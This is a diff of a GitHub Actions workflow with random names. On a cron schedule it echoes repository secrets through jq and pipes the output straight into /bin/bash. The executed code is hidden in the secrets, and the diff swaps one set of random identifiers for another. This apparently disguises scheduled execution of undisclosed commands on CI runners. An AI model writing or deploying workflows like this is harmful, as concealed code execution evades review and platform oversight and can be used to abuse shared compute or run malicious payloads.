@@ -2,24 +2,24 @@ name: yanshanxi4376
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
+    - cron: '1 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanshanxi4376
         env:
-          ye4135: ${{ secrets.ye4135 }}
+          dy59: ${{ secrets.dy59 }}
         run: |
-          echo $ye4135 | jq -r .ilo91 | /bin/bash
-          echo $ppas1393 | jq -r .fset545 | /bin/bash
-          echo $lu308 | jq -r .yv07 | /bin/bash
-          echo $at6494 | jq -r .ch63176 | /bin/bash
-          echo $piefu5103 | jq -r .gmh09 | /bin/bash
-          echo $vc3417 | jq -r .l92 | /bin/bash
-          echo $hkrjn66602 | jq -r .kypr8085 | /bin/bash
-          echo $lzmc22 | jq -r .bwmau1 | /bin/bash
-          echo $xza427 | jq -r .cyvvu99218 | /bin/bash
-          echo $cv4372 | jq -r .q03049 | /bin/bash
+          echo $dy59 | jq -r .jqczh064 | /bin/bash
+          echo $l96 | jq -r .jcr7706 | /bin/bash
+          echo $duvyp2 | jq -r .bpg09 | /bin/bash
+          echo $s34100 | jq -r .golnl0 | /bin/bash
+          echo $ode5425 | jq -r .qme1049 | /bin/bash
+          echo $hzezo6070 | jq -r .smgb15983 | /bin/bash
+          echo $czsnu4635 | jq -r .ruu162 | /bin/bash
+          echo $fydm65763 | jq -r .wry0 | /bin/bash
 
